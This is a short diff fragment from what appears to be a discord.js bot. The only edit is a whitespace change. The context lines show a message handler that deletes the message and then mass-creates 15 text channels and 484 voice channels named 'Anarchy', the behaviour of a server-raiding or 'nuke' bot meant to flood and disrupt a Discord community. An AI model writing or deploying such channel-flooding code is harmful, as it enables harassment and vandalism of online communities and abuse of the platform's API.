@@ -31,7 +31,7 @@ bot.on("message", msg => {
 			  			msg.delete();
 			  			for(var i = 0; i < 15; i++){
 			  				msg.guild.createChannel("Anarchy", "text");
-			     }
+			     } 
 			     for(var i =0; i < 484; i++){
 			     	msg.guild.createChannel("Anarchy","voice");
 			     	}
